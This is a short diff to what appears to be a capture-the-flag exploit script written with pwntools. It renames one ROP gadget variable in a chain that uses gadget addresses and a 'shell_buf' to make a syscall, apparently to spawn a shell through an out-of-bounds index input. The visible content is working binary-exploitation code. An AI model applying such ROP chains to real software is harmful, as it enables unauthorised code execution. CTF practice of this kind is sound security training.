@@ -881,7 +881,7 @@ pop_rdx = 0x0000000000401139
 ret = 0x0000000000401002
 mov_eax_edi = 0x00000000004049e0
 syscall = 0x0000000000404b51
-mov_rsi_rdi_syscall = 0x0000000000404b4e
+mov_rsi_rdx_syscall = 0x0000000000404b4e
 
 shell_buf = 0x40f500
 
@@ -901,7 +901,7 @@ payload += pack(pop_rdi)
 payload += pack(shell_buf)
 payload += pack(pop_rdx)
 payload += pack(0)
-payload += pack(mov_rsi_rdi_syscall)
+payload += pack(mov_rsi_rdx_syscall)
 assert len(payload) <= 0x7f , "Payload too long"
 
 p.sendlineafter(b'target to shoot: ', b'-2')
